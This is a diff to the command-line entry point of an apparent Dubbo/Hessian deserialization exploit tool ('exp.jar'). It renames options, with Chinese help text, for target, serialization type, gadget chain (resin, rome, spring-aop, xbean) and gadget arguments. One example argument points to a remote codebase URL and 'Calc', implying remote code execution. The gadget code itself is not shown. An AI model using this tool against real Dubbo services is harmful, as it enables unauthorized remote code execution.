@@ -21,14 +21,13 @@ public class Main {
 
   public static void main(String[] args) throws ParseException {
     Options options = new Options()
-        .addOption("h", false, "帮助信息")
-        .addOption("help", false, "帮助信息")
-        .addOption("t", true, "目标，例：-t 127.0.0.1:20880")
-        .addOption("s", true, "[hessian|java] 序列化类型，默认缺省hessian")
-        .addOption("protocol", true, "[dubbo|http] 通讯协议名称，默认缺省dubbo")
-        .addOption("p", true, "payload名称，hessian可选[resin|rome|spring-aop|xbean]，java可选[]")
-        .addOption("param", true, "payload入参")
-        .addOption("list", false, "输出所有payload信息")
+        .addOption("h","help", false, "帮助信息")
+        .addOption("t", "target", true, "目标，例：-t 127.0.0.1:20880")
+        .addOption("s", "serialization", true, "[hessian|java] 序列化类型，默认缺省hessian")
+        .addOption("p", "protocol", true, "[dubbo|http] 通讯协议名称，默认缺省dubbo")
+        .addOption("g", "gadget", true, "gadget名称，hessian可选[resin|rome|spring-aop|xbean]，java可选[]")
+        .addOption("a", "args", true, "gadget入参，多个参数，需要多个命令传入，例-a http://127.0.0.1:800/ -a Calc")
+        .addOption("l", "list", false, "输出所有payload信息")
         ;
 
     //parser
@@ -36,9 +35,9 @@ public class Main {
     CommandLine cmd = parser.parse(options, args);
 
     String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
-    String s = cmd.hasOption("s") ? cmd.getOptionValue("s") : "hessian";
+    String s = cmd.hasOption("serialization") ? cmd.getOptionValue("serialization") : "hessian";
 
-    if (cmd.hasOption("h") || cmd.hasOption("help")) {
+    if (cmd.hasOption("help")) {
       HelpFormatter formatter = new HelpFormatter();
       formatter.printHelp("java -jar exp.jar [OPTION]", options);
       return;
@@ -58,35 +57,34 @@ public class Main {
       return;
     }
 
-    if (!cmd.hasOption("t")) {
+    if (!cmd.hasOption("target")) {
       System.err.println("目标不能为空，例：-t 127.0.0.1:20880");
       return;
     }
 
-    String[] payloadArgs = cmd.getOptionValues("param");
+    String[] payloadArgs = cmd.getOptionValues("args");
     Payload payload;
     if (payloadArgs != null && payloadArgs.length > 0) {
-      Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("p"), s);
+      Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("gadget"), s);
       if (payloadEnum == null) {
-        System.err.println("payload[" + cmd.getOptionValue("p") + "]不存在");
+        System.err.println("gadget[" + cmd.getOptionValue("gadget") + "]不存在");
         return;
       }
       payload = payloadEnum.getPayload();
       if (payloadEnum.getParamSize() != payloadArgs.length) {
-        System.err.println("payload参数错误");
+        System.err.println("gadget参数错误");
         System.err.println(payloadEnum.getParamTis());
         return;
       }
     } else {
-      System.err.println("payload参数值不能为空，你必须输入一点参数来使payload可以使用");
+      System.err.println("gadget参数值不能为空，你必须输入一点参数来使gadget可以使用");
       return;
     }
 
     Serialization serialization = Serializations.getSerialization(s);
     byte[] bytes = serialization.makeData(payload, payloadArgs, protocol);
 
-    String target = cmd.hasOption("t") ? cmd.getOptionValue("t")
-        : cmd.getOptionValue("target");
+    String target = cmd.getOptionValue("target");
     String host = target;
     int port = 20880;
     String path = "/";
